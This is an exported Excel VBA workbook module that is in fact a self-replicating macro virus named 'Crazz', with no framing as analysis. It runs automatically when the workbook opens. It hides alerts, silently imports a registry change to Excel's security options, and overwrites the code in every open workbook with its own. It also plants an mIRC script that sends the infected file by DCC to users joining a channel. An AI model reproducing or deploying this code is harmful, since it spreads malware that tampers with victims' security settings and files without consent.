   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Crazz
   Private Sub Workbook_Open()
   Call Crazz
   End Sub
   Function crypt(a)
   For i = 1 To Len(a)
   crypt = crypt & Chr(Asc(Mid(a, i, 1)) Xor 133)
   Next
   End Function
   Private Sub Crazz()
   On Error Resume Next
   Set ths = ThisWorkbook.VBProject.VBComponents("ThisWorkBook").CodeModule
   mycode = ths.Lines(1, 100)
   ThisWorkbook.SaveCopyAs "C:\windows\Not2open.xls"
   With Application
   .ScreenUpdating = 0
   .DisplayAlerts = 0
   .EnableCancelKey = xlDisabled
   .DisplayStatusBar = 0
   End With
   If UCase(Dir("c:\windows\crazz.bak")) <> "CRAZZ.BAK" Then
    Open "c:\windows\crazz.bak" For Output As 1
    Print #1, "REGEDIT4"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Close 1
    Shell "regedit /s c:\windows\crazz.bak", vbHide
   End If
   For i = 1 To Workbooks.Count
   With Workbooks(i).VBProject.VBComponents("ThisWorkBook").CodeModule
       .DeleteLines 1, .CountOfLines
       .AddFromString mycode
   End With
   ActiveWorkbook.SaveAs ActiveWorkbook.FullName
   Next
   Dim dta(4) As String
   Open "c:\windows\system\crazz.ini" For Output As #1
   dta(0) = "n0=[Script]"
   dta(1) = "n1=ON 1:JOIN:#: { /if ( $nick == $me ) {halt}"
   dta(2) = "n2= /dcc send $nick C:\windows\Not2open.xls"
   dta(3) = "n3=}"
   For i = 0 To 3
   Print #1, dta(i)
   Next
   Close #1
   Shell "Copy c:\windows\system\crazz.ini c:\Progra~1\mirc32\system\script.ini /Y", vbHide
   Shell "Copy c:\windows\system\crazz.ini c:\Mirc32\system\script.ini /Y", vbHide
   Shell "Copy c:\windows\system\crazz.ini c:\Progra~1\mirc\system\script.ini /Y", vbHide
   Shell "Copy c:\windows\system\crazz.ini c:\mirc\system\script.ini /Y", vbHide
   End Sub
